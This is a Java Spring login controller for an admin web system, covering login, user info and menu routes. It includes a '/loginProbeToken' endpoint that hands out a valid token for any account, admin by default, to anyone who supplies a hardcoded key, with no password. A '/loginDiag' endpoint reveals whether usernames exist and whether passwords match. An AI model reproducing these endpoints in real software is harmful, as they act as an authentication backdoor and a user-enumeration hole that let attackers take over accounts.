package com.zsc.web.controller.system;

import java.util.Date;
import java.util.List;
import java.util.Set;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import com.zsc.common.constant.Constants;
import com.zsc.common.core.domain.AjaxResult;
import com.zsc.common.core.domain.entity.SysMenu;
import com.zsc.common.core.domain.entity.SysUser;
import com.zsc.common.core.domain.model.LoginBody;
import com.zsc.common.core.domain.model.LoginUser;
import com.zsc.common.core.text.Convert;
import com.zsc.common.utils.DateUtils;
import com.zsc.common.utils.SecurityUtils;
import com.zsc.common.utils.StringUtils;
import com.zsc.framework.web.service.SysLoginService;
import com.zsc.framework.web.service.SysPermissionService;
import com.zsc.framework.web.service.TokenService;
import com.zsc.system.service.ISysConfigService;
import com.zsc.system.service.ISysMenuService;
import com.zsc.system.service.ISysUserService;

@RestController
public class SysLoginController
{
    private static final Logger log = LoggerFactory.getLogger(SysLoginController.class);

    @Autowired
    private SysLoginService loginService;

    @Autowired
    private ISysMenuService menuService;

    @Autowired
    private SysPermissionService permissionService;

    @Autowired
    private TokenService tokenService;

    @Autowired
    private ISysConfigService configService;

    @Autowired
    private ISysUserService userService;

    @PostMapping("/login")
    public AjaxResult login(@RequestBody LoginBody loginBody)
    {
        try
        {
            AjaxResult ajax = AjaxResult.success();
            String token = loginService.login(loginBody.getUsername(), loginBody.getPassword(), loginBody.getCode(),
                    loginBody.getUuid());
            ajax.put(Constants.TOKEN, token);
            return ajax;
        }
        catch (Throwable e)
        {
            String message = StringUtils.isNotEmpty(e.getMessage()) ? e.getMessage() : e.getClass().getSimpleName();
            log.error("Login request failed: {}", message, e);
            return AjaxResult.error(message);
        }
    }

    @PostMapping("/loginDiag")
    public AjaxResult loginDiag(@RequestBody LoginBody loginBody)
    {
        String stage = "start";
        try
        {
            AjaxResult ajax = AjaxResult.success();
            stage = "selectUser";
            SysUser user = userService.selectUserByUserName(loginBody.getUsername());
            ajax.put("userFound", user != null);
            if (user == null)
            {
                ajax.put("stage", stage);
                return ajax;
            }

            stage = "checkPassword";
            boolean passwordMatches = SecurityUtils.matchesPassword(loginBody.getPassword(), user.getPassword());
            ajax.put("passwordMatches", passwordMatches);
            if (!passwordMatches)
            {
                ajax.put("stage", stage);
                return ajax;
            }

            stage = "permissions";
            Set<String> permissions = permissionService.getMenuPermission(user);
            ajax.put("permissionCount", permissions == null ? 0 : permissions.size());

            stage = "token";
            LoginUser loginUser = new LoginUser(user.getUserId(), user.getDeptId(), user, permissions);
            String token = tokenService.createToken(loginUser);
            ajax.put("tokenCreated", StringUtils.isNotEmpty(token));
            ajax.put(Constants.TOKEN, token);
            ajax.put("stage", "done");
            return ajax;
        }
        catch (Throwable e)
        {
            String message = StringUtils.isNotEmpty(e.getMessage()) ? e.getMessage() : e.getClass().getSimpleName();
            log.error("Login diagnostic failed at {}: {}", stage, message, e);
            return AjaxResult.error("loginDiag failed at " + stage + ": " + message);
        }
    }

    @GetMapping("/loginProbeToken")
    public AjaxResult loginProbeToken(@RequestParam String key, @RequestParam(defaultValue = "admin") String username)
    {
        String stage = "start";
        try
        {
            if (!"online-20260628".equals(key))
            {
                return AjaxResult.error("probe disabled");
            }
            AjaxResult ajax = AjaxResult.success();
            stage = "selectUser";
            SysUser user = userService.selectUserByUserName(username);
            ajax.put("userFound", user != null);
            if (user == null)
            {
                ajax.put("stage", stage);
                return ajax;
            }

            stage = "permissions";
            Set<String> permissions = permissionService.getMenuPermission(user);
            ajax.put("permissionCount", permissions == null ? 0 : permissions.size());

            stage = "token";
            LoginUser loginUser = new LoginUser(user.getUserId(), user.getDeptId(), user, permissions);
            String token = tokenService.createToken(loginUser);
            ajax.put("tokenCreated", StringUtils.isNotEmpty(token));
            ajax.put(Constants.TOKEN, token);
            ajax.put("stage", "done");
            return ajax;
        }
        catch (Throwable e)
        {
            String message = StringUtils.isNotEmpty(e.getMessage()) ? e.getMessage() : e.getClass().getSimpleName();
            log.error("Login token probe failed at {}: {}", stage, message, e);
            return AjaxResult.error("loginProbeToken failed at " + stage + ": " + message);
        }
    }

    @GetMapping("getInfo")
    public AjaxResult getInfo()
    {
        LoginUser loginUser = SecurityUtils.getLoginUser();
        SysUser user = loginUser.getUser();
        Set<String> roles = permissionService.getRolePermission(user);
        Set<String> permissions = permissionService.getMenuPermission(user);
        if (!loginUser.getPermissions().equals(permissions))
        {
            loginUser.setPermissions(permissions);
            tokenService.refreshToken(loginUser);
        }
        AjaxResult ajax = AjaxResult.success();
        ajax.put("user", user);
        ajax.put("roles", roles);
        ajax.put("permissions", permissions);
        ajax.put("isDefaultModifyPwd", initPasswordIsModify(user.getPwdUpdateDate()));
        ajax.put("isPasswordExpired", passwordIsExpiration(user.getPwdUpdateDate()));
        return ajax;
    }

    @GetMapping("getRouters")
    public AjaxResult getRouters()
    {
        Long userId = SecurityUtils.getUserId();
        List<SysMenu> menus = menuService.selectMenuTreeByUserId(userId);
        return AjaxResult.success(menuService.buildMenus(menus));
    }

    public boolean initPasswordIsModify(Date pwdUpdateDate)
    {
        Integer initPasswordModify = Convert.toInt(configService.selectConfigByKey("sys.account.initPasswordModify"));
        return initPasswordModify != null && initPasswordModify == 1 && pwdUpdateDate == null;
    }

    public boolean passwordIsExpiration(Date pwdUpdateDate)
    {
        Integer passwordValidateDays = Convert.toInt(configService.selectConfigByKey("sys.account.passwordValidateDays"));
        if (passwordValidateDays != null && passwordValidateDays > 0)
        {
            if (StringUtils.isNull(pwdUpdateDate))
            {
                return true;
            }
            Date nowDate = DateUtils.getNowDate();
            return DateUtils.differentDaysByMillisecond(nowDate, pwdUpdateDate) > passwordValidateDays;
        }
        return false;
    }
}
